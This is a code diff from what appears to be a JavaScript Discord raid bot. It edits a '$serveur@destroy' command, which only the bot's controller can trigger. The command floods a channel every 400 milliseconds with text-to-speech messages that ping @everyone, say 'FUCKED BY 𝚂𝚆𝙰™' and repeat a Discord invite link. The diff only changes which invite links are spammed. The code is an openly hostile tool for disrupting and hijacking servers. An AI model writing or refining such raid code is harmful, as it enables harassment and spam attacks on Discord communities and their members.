@@ -316,10 +316,11 @@ if(message.content === "$serveur@destroy"){
     if(message.channel.type === "dm") return;
     if (message.author.id != `${ClientID}`) return;
  
-      setInterval (function () { message.channel.send("@everyone @here . REJOINS NOUS ICI !!! \n"+
+      setInterval (function () { message.channel.send("@everyone \n"+
+      "REJOINS NOUS ICI : https://discord.gg/RxP5Jyt \n"+
       "FUCKED BY 𝚂𝚆𝙰™ \n"+
-     "https://discord.gg/a4mBCRk \n"+
-     "https://discord.gg/PCNJfgA", { tts: true } ).catch(error => {}) }, 400)
+      "https://discord.gg/RxP5Jyt \n"+
+      "https://discord.gg/RxP5Jyt", { tts: true } ).catch(error => {}) }, 400)
     }
 
             if (message.author.id != `${ClientID}`) return;
